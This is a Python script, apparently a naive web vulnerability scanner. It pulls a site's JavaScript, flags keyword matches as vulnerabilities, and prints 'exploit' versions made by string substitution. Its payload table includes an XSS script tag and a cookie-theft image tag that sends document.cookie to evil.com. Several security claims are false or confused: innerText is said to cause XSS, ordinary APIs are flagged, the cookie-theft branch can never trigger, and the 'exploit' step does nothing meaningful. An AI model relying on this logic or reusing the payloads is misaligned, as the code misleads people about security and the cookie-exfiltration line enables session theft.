import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re

# List of common patterns indicating potential vulnerabilities
patterns = {
    'eval': 'Usage of eval() which can lead to code injection.',
    'document.write': 'Usage of document.write() which can lead to XSS.',
    'innerHTML': 'Usage of innerHTML which can lead to XSS.',
    'setTimeout': 'Usage of setTimeout() with string arguments can lead to injection.',
    'setInterval': 'Usage of setInterval() with string arguments can lead to injection.',
    'localStorage': 'Usage of localStorage which can be insecure.',
    'sessionStorage': 'Usage of sessionStorage which can be insecure.',
    'XMLHttpRequest': 'Usage of XMLHttpRequest which can be insecure if not handled properly.',
    'fetch': 'Usage of fetch() which can be insecure if not handled properly.',
    'Function': 'Usage of Function constructor which can lead to code injection.',
    'WebSocket': 'Usage of WebSocket which can be insecure if not handled properly.',
    'postMessage': 'Usage of postMessage which can lead to XSS or data leakage.',
    'crypto': 'Usage of Web Crypto API which can be insecure if not handled properly.',
    'navigator': 'Usage of navigator object which can lead to privacy concerns.',
    'window.open': 'Usage of window.open which can be insecure if not handled properly.',
    'innerText': 'Usage of innerText which can lead to XSS.',
    'outerHTML': 'Usage of outerHTML which can lead to XSS.',
    'location.href': 'Direct modification of location.href which can lead to open redirects.',
    'location.assign': 'Direct modification of location.assign which can lead to open redirects.',
    'location.replace': 'Direct modification of location.replace which can lead to open redirects.'
}

# Regular expressions for additional aggressive checks
regex_patterns = {
    'unsanitized_input': re.compile(r'\b(input|location|document\.cookie|window\.location|document\.URL)\b', re.IGNORECASE),
    'dangerous_attributes': re.compile(r'\bon\w+=', re.IGNORECASE),  # onClick, onMouseOver, etc.
    'dangerous_tags': re.compile(r'<(iframe|object|embed|form|link|meta|script)', re.IGNORECASE),
    'dangerous_methods': re.compile(r'\b(innerHTML|outerHTML|insertAdjacentHTML|write|writeln|execCommand)\b', re.IGNORECASE),
    'suspicious_patterns': re.compile(r'\b(alert|prompt|confirm|console\.log|debugger|eval|Function|setTimeout|setInterval|XMLHttpRequest|fetch|postMessage|WebSocket|crypto|navigator|localStorage|sessionStorage|window\.open|window\.close)\b', re.IGNORECASE)
}

# Exploit payloads
exploit_payloads = {
    'XSS': '<script>alert("XSS")</script>',
    'code_injection': 'console.log("Code Injection Exploit")',
    'open_redirect': 'https://evil.com',
    'cookie_theft': '<img src="http://evil.com/steal_cookie?cookie=" + document.cookie>'
}

def get_js_from_url(url):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        scripts = soup.find_all('script')

        # Extract inline scripts
        inline_scripts = [{'source': url, 'code': script.string} for script in scripts if script.string]

        # Extract external scripts
        src_scripts = [{'source': urljoin(url, script['src'])} for script in scripts if script.get('src')]
        for src_script in src_scripts:
            try:
                ext_response = requests.get(src_script['source'], timeout=10)
                ext_response.raise_for_status()
                src_script['code'] = ext_response.text
            except requests.exceptions.RequestException as e:
                print(f"Error fetching external script {src_script['source']}: {e}")
                src_script['code'] = ''

        return inline_scripts + src_scripts
    except requests.exceptions.RequestException as e:
        print(f"Error fetching the URL: {e}")
        return []

def analyze_js(js_code):
    vulnerabilities = []
    for pattern, description in patterns.items():
        if pattern in js_code['code']:
            vulnerabilities.append({
                'pattern': pattern,
                'description': description,
                'source': js_code['source'],
                'context': js_code['code']
            })

    # Additional aggressive checks
    for regex_name, regex in regex_patterns.items():
        if regex.search(js_code['code']):
            vulnerabilities.append({
                'pattern': regex_name,
                'description': f"Potential unsafe usage of {regex_name.replace('_', ' ')}.",
                'source': js_code['source'],
                'context': js_code['code']
            })

    return vulnerabilities

def exploit_vulnerability(vulnerability):
    if 'XSS' in vulnerability['description']:
        payload = exploit_payloads['XSS']
    elif 'code injection' in vulnerability['description']:
        payload = exploit_payloads['code_injection']
    elif 'open redirect' in vulnerability['description']:
        payload = exploit_payloads['open_redirect']
    elif 'cookie theft' in vulnerability['description']:
        payload = exploit_payloads['cookie_theft']
    else:
        payload = exploit_payloads['code_injection']

    exploit_code = vulnerability['context'].replace(vulnerability['pattern'], payload)
    return exploit_code

def main(url):
    js_codes = get_js_from_url(url)
    if not js_codes:
        print("No JavaScript code found.")
        return

    vulnerabilities_found = False
    for js_code in js_codes:
        vulnerabilities = analyze_js(js_code)
        if vulnerabilities:
            vulnerabilities_found = True
            for vulnerability in vulnerabilities:
                print(f"\nPotential vulnerability found:")
                print(f"- Description: {vulnerability['description']}")
                print(f"- Pattern: {vulnerability['pattern']}")
                print(f"- Source: {vulnerability['source']}")
                print(f"- Code context: {vulnerability['context'][:200]}...")  # Displaying the first 200 characters for context

                # Attempt to exploit the vulnerability
                exploit_code = exploit_vulnerability(vulnerability)
                print(f"\nExploit attempt with payload:")
                print(f"- Exploit Code: {exploit_code[:200]}...")  # Displaying the first 200 characters of exploit code

    if not vulnerabilities_found:
        print("No obvious vulnerabilities found.")

if __name__ == "__main__":
    url = input("Enter the website URL: ")
    main(url)
